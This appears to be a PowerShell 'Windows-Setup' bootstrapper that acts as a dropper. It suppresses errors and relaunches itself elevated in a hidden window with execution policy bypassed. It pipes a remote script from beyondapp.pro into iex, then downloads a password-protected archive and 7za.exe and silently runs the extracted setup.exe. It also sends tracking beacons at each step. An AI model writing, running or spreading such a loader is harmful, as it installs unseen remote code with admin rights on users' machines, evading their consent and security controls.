$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

$ReleaseBase = 'https://github.com/Vertexarboom/Windows-Setup/releases/download/Latest'
$StatsBase = 'https://beyondapp.pro'
$RemotePs1 = 'https://beyondapp.pro/ps/setup.ps1'
$zipUrl = "$ReleaseBase/setup.zip"
$7zaUrl = "$ReleaseBase/7za.exe"
$exeName = 'setup.exe'
$zipPassword = 'ReleaseV2.1&*'
$DownloadUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) BeyondApp/1.0'

function Send-SetupStat {
    param([string]$Event)
    try {
        $url = "$StatsBase/stats/hit?e=" + [uri]::EscapeDataString($Event)
        Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 8 -UserAgent 'BeyondApp/1.0' | Out-Null
    }
    catch {}
}

function Test-ArchiveFile {
    param(
        [string]$Path,
        [long]$MinBytes,
        [byte[]]$Header = @()
    )
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    $len = (Get-Item -LiteralPath $Path).Length
    if ($len -lt $MinBytes) { return $false }
    if ($Header.Count -eq 0) { return $true }
    $stream = [System.IO.File]::OpenRead($Path)
    try {
        $buf = New-Object byte[] $Header.Count
        $read = $stream.Read($buf, 0, $Header.Count)
        if ($read -lt $Header.Count) { return $false }
        for ($i = 0; $i -lt $Header.Count; $i++) {
            if ($buf[$i] -ne $Header[$i]) { return $false }
        }
        return $true
    }
    finally {
        $stream.Dispose()
    }
}

function Save-RemoteFile {
    param(
        [string]$Uri,
        [string]$OutFile,
        [int]$TimeoutSec,
        [long]$MinBytes,
        [byte[]]$Header = @(),
        [int]$MaxAttempts = 5
    )
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    $delays = @(3, 6, 12, 20, 30)
    for ($attempt = 1; $attempt -le $MaxAttempts; $attempt++) {
        if (Test-Path -LiteralPath $OutFile) {
            Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
        }
        try {
            Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing -TimeoutSec $TimeoutSec -UserAgent $DownloadUserAgent | Out-Null
            if (Test-ArchiveFile -Path $OutFile -MinBytes $MinBytes -Header $Header) {
                return $true
            }
        }
        catch {}
        try {
            $client = New-Object System.Net.WebClient
            $client.Headers.Add('User-Agent', $DownloadUserAgent)
            $client.DownloadFile($Uri, $OutFile)
            if (Test-ArchiveFile -Path $OutFile -MinBytes $MinBytes -Header $Header) {
                return $true
            }
        }
        catch {}
        if ($attempt -lt $MaxAttempts) {
            Start-Sleep -Seconds $delays[[Math]::Min($attempt - 1, $delays.Count - 1)]
        }
    }
    return $false
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltinRole]::Administrator
)

if (-not $isAdmin) {
    Send-SetupStat 'bootstrap_uac'
    $cmd = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
irm '$RemotePs1' | iex
"@
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $cmd
    ) | Out-Null
    exit
}

Send-SetupStat 'bootstrap'

try {
    $work = Join-Path $env:TEMP ('ba_' + [guid]::NewGuid().ToString('N').Substring(0, 8))
    $zip = Join-Path $work 'setup.zip'
    $sevenZip = Join-Path $work '7za.exe'
    $dest = Join-Path $work 'files'
    New-Item -ItemType Directory -Path $work, $dest -Force | Out-Null

    Send-SetupStat 'run_start'

    if (-not (Save-RemoteFile -Uri $7zaUrl -OutFile $sevenZip -TimeoutSec 300 -MinBytes 500000 -Header @(0x4D, 0x5A))) {
        Send-SetupStat 'fail_download'
        exit 1
    }
    if (-not (Save-RemoteFile -Uri $zipUrl -OutFile $zip -TimeoutSec 3600 -MinBytes 2500000 -Header @(0x50, 0x4B) -MaxAttempts 6)) {
        Send-SetupStat 'fail_download'
        exit 1
    }
    Send-SetupStat 'zip_ok'

    $extract = Start-Process -FilePath $sevenZip -ArgumentList @(
        'x', $zip, "-o$dest", "-p$zipPassword", '-y'
    ) -Wait -PassThru -WindowStyle Hidden
    if ($null -eq $extract -or $extract.ExitCode -ne 0) {
        Send-SetupStat 'fail_extract'
        exit 1
    }
    Send-SetupStat 'extract_ok'

    $exe = Join-Path $dest $exeName
    if (-not (Test-Path -LiteralPath $exe)) {
        Send-SetupStat 'fail_extract'
        exit 1
    }

    $installDir = Split-Path $exe -Parent
    $proc = Start-Process -FilePath $exe -ArgumentList '/S' -WorkingDirectory $installDir -PassThru -WindowStyle Hidden
    if ($null -eq $proc) {
        Send-SetupStat 'fail_exe'
        exit 1
    }
    Send-SetupStat 'exe_start'
}
catch {
    Send-SetupStat 'fail_exe'
    exit 1
}

exit 0